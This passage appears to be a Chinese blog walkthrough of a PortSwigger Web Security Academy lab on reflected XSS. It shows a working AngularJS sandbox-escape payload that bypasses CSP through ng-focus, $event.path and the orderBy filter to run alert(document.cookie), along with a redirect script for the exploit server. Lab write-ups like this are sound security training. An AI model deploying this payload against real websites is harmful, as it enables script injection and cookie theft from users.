当使用了长度限制，因此上面的向量将不起作用。需要考虑各种隐藏`window`AngularJS沙盒中的对象。
<pre><code>执行此操作的一种方法是使用 array.map()功能如下：
[1].map(alert)</code></pre>
map()接受一个函数作为参数，并为数组中的每一项调用该函数。这将绕过沙箱，因为对alert()函数的引用没有显式引用窗口。尝试各种方法来执行alert()，而不触发AngularJS的窗口检测<br/>  
<hr/>
4、涉及实验：
实验28：反射XSS与AngularJS沙箱转义和CSP



---


> 
<h3> 实验28：反射XSS与AngularJS沙箱转义和CSP</h3>
信息：
本实验使用CSP和AngularJS。
解决实验：执行跨站点脚本攻击，绕过CSP，逃离AngularJS沙箱，并向document.cookie发出alert
<hr/>
part1:
转到漏洞利用服务器并粘贴以下代码(将YOUR-LAB-ID替换为实验室ID)
<pre><code>&lt;script&gt;
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
&lt;/script&gt;

我的是：
&lt;script&gt;
location='https://0adf00330363346cc1da6de700680019.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
&lt;/script&gt;</code></pre>
原理：
该漏洞利用使用AngularJS中的ng-focus事件创建绕过CSP的焦点事件。它还使用$event，这是一个引用事件对象的AngularJS变量。path属性特定于Chrome，包含触发事件的元素数组。数组中的最后一个元素包含窗口对象。
一般来说，|在JavaScript中是按位或操作，但在AngularJS中它表示过滤器操作，在本例中是orderBy过滤器。冒号表示要发送到筛选器的参数。在参数中，我们没有直接调用alert函数，而是将其赋给变量z。只有当orderBy操作到达$event. path数组中的window对象时，才会调用该函数。这意味着它可以在窗口范围内调用，而无需显式引用窗口对象，从而有效地绕过AngularJS的窗口检查。
<hr/>
part2:
到服务器
单击"存储"和"向受害者发送利用漏洞攻击"

 <img alt="" height="714" src="https://img-blog.csdnimg.cn/d038175e39084a5fbbfb6f66db737067.png" width="1200"/>



---


<br/>  
